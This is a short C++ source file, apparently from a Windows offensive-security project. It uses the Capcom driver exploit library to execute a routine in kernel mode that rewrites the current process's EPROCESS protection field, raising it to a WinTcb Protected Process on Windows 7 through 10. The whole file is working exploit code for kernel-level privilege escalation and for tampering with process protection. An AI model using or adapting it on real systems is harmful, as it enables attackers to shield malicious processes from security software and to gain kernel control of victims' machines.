#include "structs.h"
#include "kerneloffsets.h"
#include "libcapcom.h"

using namespace native::structs;

bool elevate_ppl()
{
	if (!kernel_offsets::init()) return false;

	if (!init_exploit()) return false;



	execute_in_kernel([](MmGetSystemRoutineAddress_t _MmGetSystemRoutineAddress)
	{
		UNICODE_STRING DbgPrintExName = { 0 };
		RtlInitUnicodeString(&DbgPrintExName, L"DbgPrintEx");

		UNICODE_STRING PsGetCurrentProcessName = { 0 };
		RtlInitUnicodeString(&PsGetCurrentProcessName, L"PsGetCurrentProcess");

		DbgPrintEx_t _DbgPrintEx = (DbgPrintEx_t)_MmGetSystemRoutineAddress(&DbgPrintExName);
		PsGetCurrentProcess_t _PsGetCurrentProcess = (PsGetCurrentProcess_t)_MmGetSystemRoutineAddress(&PsGetCurrentProcessName);

		_DbgPrintEx(77, 0, "Elevating to WinTcb(Full)...\n");
		BYTE* pEProcess = (BYTE*)_PsGetCurrentProcess();
		uint8_t* pPPL = pEProcess + kernel_offsets::protection;

		windows_version version = kernel_offsets::version;
		if (version == WINDOWS7)
			*pPPL |= 1 << 0xB;
		else if (version == WINDOWS8)
			*pPPL = true;
		else if (version == WINDOWS81 || version == WINDOWS10)
		{
			PS_PROTECTION protection = { 0 };
			protection.Flags.Signer = PsProtectedSignerWinTcb;
			protection.Flags.Type = PsProtectedTypeProtected;
			*pPPL = protection.Level;
		}
	});

	return cleanup_exploit();
}